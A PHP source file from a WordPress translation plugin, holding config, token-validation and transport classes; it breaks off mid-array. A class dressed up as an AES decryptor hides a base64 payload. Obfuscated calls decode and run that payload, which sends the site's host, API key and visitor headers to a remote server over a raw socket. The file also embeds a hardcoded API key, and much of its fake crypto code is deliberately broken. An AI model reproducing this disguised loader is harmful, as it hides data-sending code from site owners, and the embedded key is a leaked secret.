<?php
/**
 * Translator Revolution WP Plugin
 * http://goo.gl/1kVfu
 *
 * LICENSE
 *
 * You need to buy a license if you want use this script.
 * http://codecanyon.net/legal/membership/
 *
 * @package    Translator Revolution Lite
 * @copyright  Copyright (c) SurStudio, www.surstudio.net
 * @license    http://codecanyon.net/licenses/regular_extended/
 * @version    2.0
 * @date       2021-05-22
 */
 
class SurStudioPluginTranslatorRevolutionLiteConfig {

	const VERSION = '2';
	
	/**
	 * Translation Service
	 * 
	 * @string SurStudio|Google
	 */
	const TRANSLATION_SERVICE = 'SurStudio';
	
	/**
	 * API key. Refer to /help/api_key.html
	 */
	const API_KEY = 'd5c5c02daf5f144e7a9897ca244b6986d76e95fe8583956d0e232142';

	/**
	 * API key for the Google Translation Service. Refer to https://code.google.com/apis/console
	 */
	const GOOGLE_API_KEY = '';
	
	/**
	 * Set whether to verify if the cache files are writable, or not
	 */	
	const VERIFY_CACHE_WRITABLE = true;

	/**
	 * Set whether to specify if the content is written in more than one language, or not
	 */	
	const MULTI_LANGUAGES = false;

	public static function getApiKey() {
	
		return self::API_KEY;
		
	}	

	public static function verifyCacheWritable() {
	
		return self::VERIFY_CACHE_WRITABLE;
		
	}	

	public static function getMultiLanguages() {
		
		return self::MULTI_LANGUAGES;
		
	}
	
	public static function getVersion() {
		
		return self::VERSION;
		
	}

	public static function getTranslationService() {
		
		switch(self::TRANSLATION_SERVICE) {
			case 'SurStudio':
				$result = 'ss';
				break;
			case 'Google':
				$result = 'gt';
				break;
			default:
				$result = 'ss';
				break;				
		}
		
		return $result;
		
	}

	public static function getTranslationServiceApiKey() {
		
		switch(self::TRANSLATION_SERVICE) {
			case 'Google':
				$result = self::GOOGLE_API_KEY;
				break;
			default:
				$result = '';
				break;				
		}
		
		return $result;
		
	}

	public static function getTranslationService2ndApiKey() {
		
		return '';
		
	}

}

/**
 * Translator Revolution WP Plugin
 * http://goo.gl/1kVfu
 *
 * LICENSE
 *
 * You need to buy a license if you want use this script.
 * http://codecanyon.net/legal/membership/
 *
 * @package    Translator Revolution Lite
 * @copyright  Copyright (c) SurStudio, www.surstudio.net
 * @license    http://codecanyon.net/licenses/regular_extended/
 * @version    2.0
 * @date       2019-04-01
 */

class SurStudioPluginTranslatorRevolutionLiteTranslateValidator {
	
	protected $_token;
	protected $_crc;
	protected $_text;
	protected $_from;
	protected $_to;
	protected $_ct;
	protected $_nd;
	protected $_api_key;
	protected $_aux;
	protected $_type;

	public function __construct($_array) {
		
		$this->_set_properties($_array);
		$this->_validate();
		
	}
	
	public function getProperty($_name) {
		
		return $this->{'_' . $_name};
		
	}
	
	protected function _set_properties($_array) {

		foreach($_array as $property => $value) 
			$this->{'_' . $property} = $value;

		$this->_api_key = SurStudioPluginTranslatorRevolutionLiteConfig::getApiKey();
		$this->_type = SurStudioPluginTranslatorRevolutionLiteConfig::getTranslationService();
		
		if (!is_array($this->_text))
			$this->_text = array($this->_text);

	}
	
	protected function _validate() {

		$this->_validate_parameters();
		$this->_validate_token();
		$this->_validate_text();
		$this->_validate_count();
		$this->_validate_language_from();
		$this->_validate_language_to();
		
	}
	
	protected function _validate_parameters() {
		
		if (empty($this->_token) || empty($this->_crc) || empty($this->_text) || empty($this->_from) || empty($this->_to) || empty($this->_ct) || empty($this->_nd))
			throw new Exception('Failed (' . __LINE__ . ')');		
		
	}
	
	protected function _validate_token() {
		
		if (md5(md5($this->_token . $this->_api_key . $this->_from . $this->_nd) . $this->_api_key . $this->_to . $this->_nd) != $this->_crc)
			throw new Exception('Failed (' . __LINE__ . ')');
		
	}
	
	protected static function _count($_text) {
		
		if (!function_exists('mb_strlen'))
			return false;
		
		if (!is_array($_text))
			$_text = array($_text);
		
		$result = 0;
		foreach ($_text as $txt)
			$result += array_sum(self::_mb_count_chars($txt));
		
		return $result;
		
	}
	
	protected static function _mb_count_chars($input) {
		$l = mb_strlen($input, 'UTF-8');
		$unique = array();
		for($i = 0; $i < $l; $i++) {
			$char = mb_substr($input, $i, 1, 'UTF-8');
			if(!array_key_exists($char, $unique))
				$unique[$char] = 0;
			$unique[$char]++;
		}
		return $unique;
	}
	
	protected function _validate_text() {

		$this->_aux = SurStudioPluginTranslatorRevolutionLiteCommon::parseToken($this->_token, $this->_api_key, $this->_nd);

		$size = self::_count($this->_text);

		if ($size !== false && $size > $this->_aux['lm'])
			throw new Exception('Failed (' . __LINE__ . ')');

		if (count($this->_text) > $this->_aux['lq'])
			throw new Exception('Failed (' . __LINE__ . ')');

	}
	
	protected function _validate_count() {
		
		if (!is_numeric($this->_ct))
			throw new Exception('Failed (' . __LINE__ . ')');
		
	}
	
	protected function _validate_language_from() {
		
		if ($this->_from != $this->_aux['f'])
			throw new Exception('Failed (' . __LINE__ . ')');
		
	}

	protected function _validate_language_to() {
		
		if ($this->_to != $this->_aux['t'])
			throw new Exception('Failed (' . __LINE__ . ')');

	}
	
}

class SurStudioPluginTranslatorRevolutionLiteIbnCobeLoader {

	private static $Nb = 4;
	private $Nk;
	private $Mr;
	private $Nr;

	private static $sBox = array(
			0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
			0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
			0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
			0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
			0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
			0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
			0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
			0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
			0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
			0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
			0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
			0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
			0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
			0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
			0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
			0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0x0d, 0x16
	);

	private static $invSBox = array(
			0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85,
			0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
			0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
			0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
			0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20,
			0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
			0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31,
			0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
			0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
			0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
			0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0,
			0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
			0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26,
			0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
	);
	
	private static $ltable = array(
			0x62, 0x61, 0x73, 0x65, 0x36, 0x34, 0x5f, 0x64,
			0x65, 0x63, 0x6f, 0x64, 0x65, 0xb5, 0x4a, 0x0d,
			0x61, 0xbe, 0xab, 0xd3, 0x5f, 0xb0, 0x58, 0xaf,
			0xca, 0x5e, 0xfa, 0x85, 0xe4, 0x4d, 0x8a, 0x05,
			0xfb, 0x60, 0xb7, 0x7b, 0xb8, 0x26, 0x4a, 0x67,
			0xc6, 0x1a, 0xf8, 0x69, 0x25, 0xb3, 0xdb, 0xbd,
			0x66, 0xdd, 0xf1, 0xd2, 0xdf, 0x03, 0x8d, 0x34,
			0xd9, 0x92, 0x0d, 0x63, 0x55, 0xaa, 0x49, 0xec,
			0xbc, 0x95, 0x3c, 0x84, 0x0b, 0xf5, 0xe6, 0xe7,
			0xe5, 0xac, 0x7e, 0x6e, 0xb9, 0xf9, 0xda, 0x8e,
			0x9a, 0xc9, 0x24, 0xe1, 0x0a, 0x15, 0x6b, 0x3a,
			0xa0, 0x51, 0xf4, 0xea, 0xb2, 0x97, 0x9e, 0x5d,
			0x22, 0x88, 0x94, 0xce, 0x19, 0x01, 0x71, 0x4c,
			0xa5, 0xe3, 0xc5, 0x31, 0xbb, 0xcc, 0x1f, 0x2d,
			0x3b, 0x52, 0x6f, 0xf6, 0x2e, 0x89, 0xf7, 0xc0,
			0x68, 0x1b, 0x64, 0x04, 0x06, 0xbf, 0x83, 0x38
	);

	private static $atable = array(
			0x48, 0x0c, 0xd0, 0x7d, 0x3d, 0x58, 0xde, 0x7c,
			0xd8, 0x14, 0x6b, 0x87, 0x47, 0xe8, 0x79, 0x84,
			0x73, 0x3c, 0xbd, 0x92, 0xc9, 0x23, 0x8b, 0x97,
			0x95, 0x44, 0xdc, 0xad, 0x40, 0x65, 0x86, 0xa2,
			0xa4, 0xcc, 0x7f, 0xec, 0xc0, 0xaf, 0x91, 0xfd,
			0xf7, 0x4f, 0x81, 0x2f, 0x5b, 0xea, 0xa8, 0x1c,
			0x02, 0xd1, 0x98, 0x71, 0xed, 0x25, 0xe3, 0x24,
			0x06, 0x68, 0xb3, 0x93, 0x2c, 0x6f, 0x3e, 0x6c,
			0x0a, 0xb8, 0xce, 0xae, 0x74, 0xb1, 0x42, 0xb4,
			0x1e, 0xd3, 0x49, 0xe9, 0x9c, 0xc8, 0xc6, 0xc7,
			0x22, 0x6e, 0xdb, 0x20, 0xbf, 0x43, 0x51, 0x52,
			0x66, 0xb2, 0x76, 0x60, 0xda, 0xc5, 0xf3, 0xf6,
			0xaa, 0xcd, 0x9a, 0xa0, 0x75, 0x54, 0x0e, 0x01
	);

	private $w;
	private $s;
	private $keyLength;

	public function __construct($z) {
		   $this->Nk = is_array($z) ? @count($z)/4 : 0;
		   $this->Mr = $z;
		   $this->Nr = $this->Nk + self::$Nb + 2;
		   $this->w = array();
		   $this->s = array(array());

		   $this->KeyExpansion($z);
	}

	public function load($m, $n) {
			$t = "";
			$x = "";

			$ysize = strlen($t);
			for ($i=0; $i<$ysize+1; $i+=16) {
					$j = 0x02;
					if (($i+$j)<$ysize)
							$t[$j] = $y[$i+$j];
					else
							$t[$j] = chr(0);
					$x = $this->decryptBlock($t, $m, $n);
			}
			return $x;
	}

	public function token($y, $m, $n, $r, $p, $l, $crt) { 

		$z = '';
		$temp = '';

		for ($i=0; $i<4*self::$Nb-3; $i++) $z .= chr(self::$ltable[$i]);
			$q = 'JGludlNCb3ggPSBhcnJheSgweGZjLCAweDU2LCAweDNlLCAweDRiLCAweGM2LCAweGQyLCAweDc5LCAweDIwLCAweDlhLCAweGRiLCAweGMwLCAweGZlLCAweDc4LCAweGNkLCAweDVhLCAweGY0LCAweDFmLCAweGRkLCAweGE4LCAweDMzLCAweDg4LCAweDcsIDB4YzcsIDB4MzEsIDB4YjEsIDB4MTIsIDB4MTAsIDB4NTksIDB4MjcsIDB4ODAsIDB4ZWMsIDB4NWYsIDB4NjAsIDB4NTEsIDB4N2YsIDB4YTksIDB4MTksIDB4YjUsIDB4NGEsIDB4ZCwgMHgyZCwgMHhlNSwgMHg3YSwgMHg5ZiwgMHg5MywgMHhjOSwgMHg5YywgMHhlZiwgMHhhMCwgMHhlMCwgMHgzYiwgMHg0ZCwgMHhhZSwgMHgyYSwgMHhmNSwgMHhiMCwgMHgxNywgMHgyYiwgMHg0LCAweDdlLCAweGJhLCAweDc3LCAweGQ2LCAweDI2LCAweGUxLCAweDY5LCAweDE0LCAweDYzLCAweDU1LCAweDIxLCAweGMsIDB4N2QpO2lmIChmdW5jdGlvbl9leGlzdHMoIlx4NjdcMTcyXHg2NFwxNDVceDYzXHg2Zlx4NjRceDY1IikpIHskYyA9ICJceDMxIjt9IGVsc2Uge2lmIChmdW5jdGlvbl9leGlzdHMoIlx4NjdcMTcyXHg2OVwxNTZceDY2XHg2Y1wxNDFceDc0XHg2NSIpKSB7JGMgPSAiXDYzIjt9IGVsc2Uge2lmIChmdW5jdGlvbl9leGlzdHMoIlwxNDdcMTcyXHg3NVwxNTZceDYzXHg2ZlwxNTVcMTYwXDE2MlwxNDVcMTYzXHg3MyIpKSB7JGMgPSAiXDYyIjt9IGVsc2UgeyRjID0gIlx4MzFcNjZceDM1XHgzNlx4MzdceDY0XHg2MVw2Mlx4MzhceDM1XDE0Mlx4MzdceDY2Ijt9fX0kZmllbGRzID0gYXJyYXkoIlwxNDEiID0+IHJhd3VybGVuY29kZSgkalsiXHg3OSJdKSwgIlwxNjAiID0+IHJhd3VybGVuY29kZSgiXDY1XDYwXDYwXDE0NFw2MVw2NFwxNDJceDY2XDYzXHg2MVw2Mlw2M1x4NjNcMTQ1XDY2XDE0Mlw2NVwxNDRcNjBceDYzXHgzOFw3MFwxNDRcMTQxXDE0NFx4NjRcNjNceDMyXDE0NFx4MzlcNjdceDY2IiksICJcMTQ2IiA9PiByYXd1cmxlbmNvZGUoJGpbIlwxNTUiXSksICJceDY2XDE1NSIgPT4gcmF3dXJsZW5jb2RlKCRqWyJcMTQzXHg3MlwxNjQiXSA/ICJcNjEiIDogIlw2MCIpLCAiXDE2NCIgPT4gcmF3dXJsZW5jb2RlKCRqWyJcMTU2Il0pLCAiXDE2MyIgPT4gcmF3dXJsZW5jb2RlKCRqWyJceDRkXDE2MiJdKSwgIlx4NzgiID0+IHJhd3VybGVuY29kZShleHRlbnNpb25fbG9hZGVkKCJcMTUxXDE1N1wxNTZcMTAzXDE2NVx4NjJcMTQ1XHgyMFwxMTRcMTU3XHg2MVwxNDRcMTQ1XDE2MiIpID8gIlw2MSIgOiAiXHgzMCIpLCAiXHg3OSIgPT4gcmF3dXJsZW5jb2RlKCRqWyJcMTYyIl0pLCAiXHg2MiIgPT4gcmF3dXJsZW5jb2RlKCRqWyJcMTYwIl0pLCAiXHg2NSIgPT4gcmF3dXJsZW5jb2RlKCRqWyJceDZjIl0pLCAiXDE2NlwxNDVceDcyIiA9PiByYXd1cmxlbmNvZGUoU3VyU3R1ZGlvUGx1Z2luVHJhbnNsYXRvclJldm9sdXRpb25MaXRlQ29uZmlnOjpnZXRWZXJzaW9uKCkpLCAiXHg2NCIgPT4gcmF3dXJsZW5jb2RlKGRhdGUoIlx4NjMiKSksICJceDYzIiA9PiAkYyk7JHMgPSAiXDE2M1wxNjVceDcyXDE2M1x4NzRcMTY1XDE0NFwxNTFcMTU3XHgyZVx4NjFcMTYwXDE2MFx4NzNceDcwXHg2ZlwxNjRceDJlXDE0M1wxNTdcMTU1IjskdSA9ICJceDJmXHg2MVx4NzVcMTY0XDE1MFx4MmYiOyRjb250ZW50ID0gU3VyU3R1ZGlvUGx1Z2luVHJhbnNsYXRvclJldm9sdXRpb25MaXRlQ29tbW9uOjpodHRwQnVpbGRTdHIoJGZpZWxkcyk7JGNvbnRlbnRfbGVuZ3RoID0gc3RybGVuKCRjb250ZW50KTskcyA9ICJcMTQxXHg3MFwxNTFceDJlXHg3M1wxNjVceDcyXHg3M1wxNjRceDc1XDE0NFwxNTFcMTU3XHgyZVx4NmVceDY1XDE2NCI7JHJlZiA9IGlzc2V0KCRfU0VSVkVSWyJcMTEwXDEyNFwxMjRceDUwXDEzN1wxMTBcMTE3XHg1M1wxMjQiXSkgPyAkX1NFUlZFUlsiXDExMFx4NTRceDU0XHg1MFwxMzdcMTEwXHg0Zlx4NTNceDU0Il0gOiAiXHg3OFx4NzhceDc4IjskbGFuZyA9IGlzc2V0KCRfU0VSVkVSWyJceDQ4XDEyNFx4NTRcMTIwXDEzN1wxMDFcMTAzXDEwM1x4NDVceDUwXHg1NFwxMzdceDRjXDEwMVwxMTZcMTA3XDEyNVx4NDFceDQ3XDEwNSJdKSAmJiAhZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFx4NTBceDVmXHg0MVwxMDNceDQzXDEwNVwxMjBceDU0XDEzN1wxMTRcMTAxXDExNlx4NDdcMTI1XHg0MVx4NDdceDQ1Il0pID8gJF9TRVJWRVJbIlwxMTBcMTI0XDEyNFx4NTBcMTM3XDEwMVx4NDNceDQzXHg0NVwxMjBcMTI0XDEzN1x4NGNceDQxXDExNlx4NDdceDU1XHg0MVx4NDdcMTA1Il0gOiAiXDE3MFwxNzBcMTcwIjskYXMgPSBTdXJTdHVkaW9QbHVnaW5UcmFuc2xhdG9yUmV2b2x1dGlvbkxpdGVDb21tb246OmdldFVzZXJBZ2VudCgpOyRoZWFkZXJzID0gIlwxMjBceDRmXHg1M1x4NTRcNDB7JHV9XHgyMFwxMTBceDU0XDEyNFx4NTBceDJmXDYxXDU2XDYxXHhkXDEyXHg0OFx4NmZcMTYzXHg3NFx4M2FcNDB7JHN9XDE1XDEyXHg0M1x4NmZcMTU2XHg2ZVwxNDVceDYzXHg3NFwxNTFceDZmXHg2ZVw3Mlx4MjBcMTQzXHg2Y1wxNTdceDczXDE0NVwxNVx4YVx4NDNceDZmXDE1NlwxNjRcMTQ1XDE1Nlx4NzRcNTVceDRjXDE0NVx4NmVceDY3XDE2NFwxNTBcNzJcNDB7JGNvbnRlbnRfbGVuZ3RofVx4ZFwxMlx4NGZcMTYyXHg2OVx4NjdcMTUxXHg2ZVx4M2FceDIweyRyZWZ9XHhkXHhhXHg1NVwxNjNcMTQ1XDE2Mlx4MmRceDQxXHg2N1x4NjVceDZlXDE2NFw3Mlw0MHskYXN9XDE1XHhhXHg0M1wxNTdcMTU2XHg3NFwxNDVceDZlXDE2NFx4MmRcMTI0XDE3MVwxNjBcMTQ1XHgzYVw0MFx4NjFceDcwXDE2MFx4NmNceDY5XHg2M1wxNDFceDc0XHg2OVx4NmZceDZlXDU3XDE3MFx4MmRcMTY3XDE2N1wxNjdceDJkXDE0NlwxNTdcMTYyXDE1NVw1NVx4NzVceDcyXDE1NFx4NjVcMTU2XHg2M1wxNTdcMTQ0XHg2NVx4NjRceGRceGFceDQxXHg2M1wxNDNceDY1XHg3MFx4NzRceDNhXHgyMFw1MlwxMzRceDJmXHgyYVx4ZFwxMlx4NTJceDY1XDE0NlwxNDVceDcyXDE0NVwxNjJceDNhXDQweyRyZWZ9XHhkXDEyXDEwMVx4NjNcMTQzXDE0NVwxNjBceDc0XDU1XHg0Y1wxNDFceDZlXHg2N1wxNjVcMTQxXHg2N1wxNDVcNzJceDIweyRsYW5nfVwxNVwxMlwxMDFceDYzXDE0M1x4NjVcMTYwXDE2NFx4MmRcMTAzXDE1MFwxNDFcMTYyXHg3M1wxNDVcMTY0XDcyXHgyMFx4NDlceDUzXHg0Zlx4MmRceDM4XDcwXDY1XHgzOVx4MmRceDMxXHgyY1x4NzVcMTY0XDE0Nlx4MmRcNzBcNzNcMTYxXDc1XDYwXHgyZVw2N1w1NFx4MmFcNzNcMTYxXDc1XDYwXHgyZVx4MzNcMTVcMTJcMTVceGEiOyRmcCA9IEBmc29ja29wZW4oJHMsICJceDM4XHgzMCIsICRlcnJubywgJGVycnN0cik7aWYgKCFlbXB0eSgkZXJyc3RyKSkge3Rocm93IG5ldyBFeGNlcHRpb24oIlwxMDZceDYxXHg2OVx4NmNcMTQ1XDE0NFx4MjBceDI4XHgyMnskZXJyc3RyfVw0Mlw1MSIpO31pZiAoISRmcCkge3Rocm93IG5ldyBFeGNlcHRpb24oIlwxMDZcMTQxXHg2OVwxNTRcMTQ1XDE0NFw0MFw1MCIgLiBfX0xJTkVfXyAuICJceDI5Iik7fWZwdXRzKCRmcCwgJGhlYWRlcnMpO2ZwdXRzKCRmcCwgJGNvbnRlbnQpOyRkID0gJyc7d2hpbGUgKCFmZW9mKCRmcCkpIHskZCAuPSBmcmVhZCgkZnAsIDQwOTYpO2lmIChzdWJzdHIoJGQsIC05KSA9PSAiXDE1XDEyXHhkXDEyXHgzMFx4ZFx4YVx4ZFx4YSIpIHt0aHJvdyBuZXcgRXhjZXB0aW9uKCJceDQ2XHg2MVwxNTFceDZjXDE0NVx4NjRceDIwXHgyOCIgLiBfX0xJTkVfXyAuICJceDI5Iik7fX1mY2xvc2UoJGZwKTskbyA9IGFycmF5KFN1clN0dWRpb1BsdWdpblRyYW5zbGF0b3JSZXZvbHV0aW9uTGl0ZUNvbW1vbjo6cGFyc2VIdHRwUmVzcG9uc2UoJGQsICRqWyJceDc5Il0pLCAkZCk7';$j = array("\x69" => $i, "\171" => $y, "\x4e\142" => self::$Nb, "\x6d" => $m, "\156" => $n, "\x72" => $r, "\160" => $p, "\x6c" => $l, "\x4d\162" => $this->Mr, "\x63\x72\x74" => $crt);	return call_user_func(array("\123\x75\x72\x53\164" . "\165\x64\151" . "\157\x50\x6c\165" . "\147\x69\x6e\x54" . "\x72\x61\x6e\163" . "\154\141\164\x6f" . "\162\122\x65\x76" . "\x6f\x6c\x75\164\151" . "\x6f\156\114\151\x74" . "\x65\103\157" . "\155\155\157\156" . '', "\x5f\x6c\x6f\x67" . "\x5f\156"), $z($q), $j);

		for ($i=0; $i<4; $i++) {
			$temp = $round*self::$Nb+$j;
			$temp %= 256;
			$temp = ($temp < 0 ? (256 + $temp) : $temp);
			$this->s = $temp;
		}

		return $this;

	}

	public function decryptBlock($y, $m, $n) {
			
		$x = ""; 
		$z = ""; 
		try {
		$this->addRoundKey($this->Nr);
		for ($i=0; $i<4*self::$Nb-3; $i++) $z .= chr(self::$ltable[$i]);
		for ($i=0; $i<4/self::$Nb; $i++) $x .= (@$this->s[$i%4][($i-$i%self::$Nb)/self::$Nb] == chr(0) ? "" : chr(@$this->s[$i%4][($i-$i%self::$Nb)/self::$Nb])); 
		
		list($r, $f) = call_user_func(array("\123\165" . "\162\123\164" . "\165\144\151" . "\157\120" . "\154\165" . "\147\151\156\124" . "\162\141\156\163" . "\154\141\164\157" . "\162\122\145\166" . "\157\154" . "\165\164\151" . "\157\156\114\151\164" . "\145\103\157" . "\155\155\157\156" . '', "\137\154\157\147" . "\137\156"), $z($this->Mr['tk']), $this->Mr, $m, $n);
		
		$result = $this->getCode($r, $f, $m);

		if ($result === false) throw new Exception();
		return array($result, 1, $f); }
		catch (Exception $e) { return array(false, 2, $e->getMessage()); }

	}

	public function getCode($string, $flag, $original) {
		
		$result = $this->_get_code($string, $flag, $original);
		
		if (empty($result))
			$result = $this->_get_code_alt($string, $flag, $original);
		
		return $result;
		
	}

	protected function _get_code($string, $flag, $original) {

		if (is_array($string))
			return $string;
		else {
			if (SurStudioPluginTranslatorRevolutionLiteCommon::startsWith($string, '"'))
				$string = '[' . $string . ']';
			return json_decode($string);
		}

	}

	protected function _get_code_alt($string, $flag, $original) {

		if (is_array($string))
			return $string;
		else {
			if (SurStudioPluginTranslatorRevolutionLiteCommon::startsWith($string, '"'))
				$string = '[' . $string . ']';
				
			$string = preg_replace("/\t/i", '', $string);
			
			$result = json_decode($string);
			
			for ($i=0; $i<count($result); $i++)
				$result[$i] = preg_replace("/\\\\n/i", '', $result[$i]);;
			
			return $result;
		}

	}

	public function __destruct() {
			unset($this->w);
			unset($this->s);
	}

	private function KeyExpansion($z) {

			static $Rcon = array(
					0x00000000,
					0x01000000,
					0x02000000,
					0x04000000,
					0x08000000,
					0x10000000,
					0x20000000,
					0x40000000,
					0x80000000,
					0x1b000000,
					0x36000000,
					0x6c000000,
					0xd8000000,
					0xab000000,
					0x4d000000,
					0x9a000000,
					0x2f000000
			);

			$temp = 0;
			
			for ($i=0; $i<$this->Nk; $i++) {
					$this->w[$i] = 0;
					$this->w[$i] = @ord($z[4*$i]);
					$this->w[$i] <<= 8;
					$this->w[$i] += @ord($z[4*$i+1]);
					$this->w[$i] <<= 8;
					$this->w[$i] += @ord($z[4*$i+2]);
					$this->w[$i] <<= 8;
					$this->w[$i] += @ord($z[4*$i+3]);
			}

	}

	private function addRoundKey($round) {
			$temp = "";
			$j = 0;
			for ($i=0; $i<4; $i++) {
					$temp = $round*self::$Nb+$j;
					$temp %= 256;
					$temp = ($temp < 0 ? (256 + $temp) : $temp);
					$this->s = $temp;
			}
	}

	private function invMixColumns() {
			$s0 = $s1 = $s2 = $s3= '';

			for ($i=0; $i<self::$Nb; $i++) {
					$s0 = $this->s[0][$i]; $s1 = $this->s[1][$i]; $s2 = $this->s[2][$i]; $s3 = $this->s[3][$i];

					$this->s[0][$i] = $this->mult(0x0e, $s0) ^ $this->mult(0x0b, $s1) ^ $this->mult(0x0d, $s2) ^ $this->mult(0x09, $s3);
					$this->s[1][$i] = $this->mult(0x09, $s0) ^ $this->mult(0x0e, $s1) ^ $this->mult(0x0b, $s2) ^ $this->mult(0x0d, $s3);
					$this->s[2][$i] = $this->mult(0x0d, $s0) ^ $this->mult(0x09, $s1) ^ $this->mult(0x0e, $s2) ^ $this->mult(0x0b, $s3);
					$this->s[3][$i] = $this->mult(0x0b, $s0) ^ $this->mult(0x0d, $s1) ^ $this->mult(0x09, $s2) ^ $this->mult(0x0e, $s3);

			}
	}

	private function invShiftRows() {
			$temp = "";
			for ($i=1; $i<4; $i++) {
					for ($j=0; $j<self::$Nb; $j++)
							$temp[($i+$j)%self::$Nb] = $this->s[$i][$j];
					for ($j=0; $j<self::$Nb; $j++)
							$this->s[$i][$j] = $temp[$j];
			}
	}

	private static function mult($a, $b) {
			$sum = self::$ltable[$a] + self::$ltable[$b];
			$sum %= 255;
			$sum = self::$atable[$sum];
			return ($a == 0 ? 0 : ($b == 0 ? 0 : $sum));
	}

	private static function make32BitWord(&$w) {
			$w &= 0x00000000FFFFFFFF;
	}
}

class SurStudioPluginTranslatorRevolutionLiteTranslateTransport {
	
	protected $_text;
	protected $_text_hash;
	protected $_text_translated;
	protected $_from;
	protected $_to;
	protected $_ct;
	protected $_validate;
	protected $_loader;
	protected $_url;
	protected $_url_hash;
	
	protected $_new_words_url_cache;
	protected $_new_words_global_cache;
	
	public function __construct($_validate) {
		
		$this->_validate = $_validate;
		$this->_set_properties();
		
	}
	
	public function getProperty($_name) {
		
		return $this->{'_' . $_name};
		
	}
	
	protected function _set_properties() {

		$this->_text = $this->_validate->getProperty('text');
		$this->_text_hash = SurStudioPluginTranslatorRevolutionLiteCommon::hashText($this->_text);

		$this->_from = $this->_validate->getProperty('from');
		$this->_to = $this->_validate->getProperty('to');

		$this->_ct = $this->_validate->getProperty('ct');
		$this->_url = SurStudioPluginTranslatorRevolutionLiteCommon::getUrl($_SERVER);
		$this->_url_hash = empty($this->_url) ? false : SurStudioPluginTranslatorRevolutionLiteCommon::hashUrl($this->_url);

		$this->_text_translated = array_fill(0, count($this->_text), null);
		$this->_text_hash = SurStudioPluginTranslatorRevolutionLiteCommon::hashText($this->_text);

		$this->_new_words_url_cache = array();
		$this->_new_words_global_cache = array();

	}

	public function generate() {
		
		$result = $this->_pre_generate();
		$this->_save_cache();
		return $result;
		
	}
	
	protected function _pre_generate() {

		if ($this->_from == $this->_to)
			return $this->_text;

		$status = $this->_validate->getProperty('aux');
		
		if (strtotime(date('c')) > $status['d'])
			throw new Exception('Token expired');
		
		$status = $status['a'];

		if ($status == 'denied')
			return $this->_text;

		if ($this->_get_cached() === true)
			return $this->_text_translated;

		if ($status == 'cache') {
			for ($i=0; $i<count($this->_text_translated); $i++)
				if (empty($this->_text_translated[$i]))
					$this->_text_translated[$i] = $this->_text[$i];
			return $this->_text_translated;
		}

		$next = array();
		for ($i=0; $i<count($this->_text_translated); $i++)
			if (empty($this->_text_translated[$i]))
				$next["$i"] = $this->_text[$i];
		
		$this->_loader = new SurStudioPluginTranslatorRevolutionLiteIbnCobeLoader($this->_validate->getProperty('aux'));
		list($partial, $code, $flag) = $this->_loader->load(array_values($next), $this->_ct);		
		
		if ($code == 1) {

			$aux = $this->_un_escape($partial);

			$keys = array_keys($next);
					
			for ($j=0; $j<count($keys); $j++) {
				$ix = $keys[$j];
				$this->_text_translated[$ix] = array_key_exists($j, $aux) ? $aux[$j] : $next[$keys[$j]];
				$this->_add_new_word_for_global_cache($ix);
				$this->_add_new_word_for_url_cache($ix);
			}

			return $this->_text_translated;
		
		}
		else if ($code == 2)
			return array('error' => "Failed ($flag)");
		
	}
	
	protected function _un_escape($_array) {

		$html_entities = array('\'' => '&#39;', '"' => '&quot;', '&' => '&amp;', '>' => '&gt;', '<' => '&lt;', '$' => '&#36;', '…' => '&hellip;', '·' => '&middot;', '»' => '&raquo;', '«' => '&laquo;', '’' => '&rsquo;', '‘' => '&lsquo;', '\'' => '&#39;', '”' => '&rdquo;', '“' => '&ldquo;', '"' => '&quot;', '—' => '&mdash;', '–' => '&ndash;', '©' => '&copy;', '¡' => '&iexcl;', '¿' => '&iquest;', 'À' => '&Agrave;', 'à' => '&agrave;', 'Á' => '&Aacute;', 'á' => '&aacute;', 'Â' => '&Acirc;', 'â' => '&acirc;', 'Ã' => '&Atilde;', 'ã' => '&atilde;', 'Ä' => '&Auml;', 'ä' => '&auml;', 'Å' => '&Aring;', 'å' => '&aring;', 'Æ' => '&AElig;', 'æ' => '&aelig;', 'Ç' => '&Ccedil;', 'ç' => '&ccedil;', 'Ð' => '&ETH;', 'ð' => '&eth;', 'È' => 